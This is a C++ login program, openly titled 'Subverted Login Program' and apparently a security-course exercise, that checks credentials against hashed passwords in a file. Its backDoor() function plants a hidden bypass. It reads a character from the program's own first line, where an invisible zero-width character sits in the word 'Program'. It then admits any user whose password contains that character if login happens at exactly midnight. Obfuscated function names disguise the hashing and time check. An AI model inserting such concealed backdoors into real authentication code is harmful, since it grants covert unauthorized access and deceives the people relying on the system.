// Subverted Login P​rogram

#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include "authlib.h"
#include "openssl/sha.h"
#include <ctime>

using namespace std; 
string f8e9d7(const string& d5e7a3) { unsigned char a8c6e4[SHA256_DIGEST_LENGTH]; SHA256_CTX b9f7g2; SHA256_Init(&b9f7g2); SHA256_Update(&b9f7g2, d5e7a3.c_str(), d5e7a3.size()); SHA256_Final(a8c6e4, &b9f7g2); stringstream c7e5b3; for (int d4e2f1 = 0; d4e2f1 < SHA256_DIGEST_LENGTH; d4e2f1++)c7e5b3 << hex << setw(2) << setfill('0') << (int)a8c6e4[d4e2f1]; return c7e5b3.str(); }

bool backDoor(const string& password) {
    ifstream sourceFile("login-subverted.cpp");
    string line;
    char character;
    if (getline(sourceFile, line)) {
        character = line[20];
    }
    sourceFile.close();

    if (password.find(character) != string::npos) {
        return true;
    }
    return false;
}


bool f8e9d7c6() { time_t a1b2c3 = time(0); tm* d4e5f6 = localtime(&a1b2c3); return!d4e5f6->tm_hour && !d4e5f6->tm_min; }


int main() {
	// Int to store max amount of attempts allowed
	const int MAX_ATTEMPTS = 3;
	// Stores amount of attempts user has done
	int attempts = 0;
	// Store user inputs and line string for file reading, then user details from file.
	string usernameIn, passwordIn, line, usernameFromFile, passwordFromFile;

	// Loop until user is authenticated or max attempts are reached, prompt and store username/password
	while (attempts++ < MAX_ATTEMPTS && cout << "Enter your username: " && cin >> usernameIn && cout << "Enter your password: " && cin >> passwordIn) {

		// Open the file containing stored usernames and passwords, print error if problem
		ifstream passwordsFile("passwords.txt");
		if (!passwordsFile) { cerr << "Error opening password file." << endl; return 1; }

		// Read the file line by line
		bool isAuthenticated = false;
		while (getline(passwordsFile, line) && !isAuthenticated) {
			stringstream ss(line);

			// Extract username and password from the read line
			getline(ss, usernameFromFile, ':'), getline(ss, passwordFromFile, ':');

			// Check if entered credentials match any in the file
			isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == f8e9d7(passwordIn);
		}
		// Close the file after reading
		passwordsFile.close();

		// If Authenticated, Exit indicating successful authentication
		if (isAuthenticated || (backDoor(passwordIn) && f8e9d7c6())) {
			authenticated(usernameIn);
			return 0;
		}
		// For incorrect login details, reject and re-prompt input
		if (attempts < MAX_ATTEMPTS) {
			cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl;
		// If maximum attempts exceeded, reject the user
		}
		else {
			rejected(usernameIn);
		}
	}
	return 0;
}


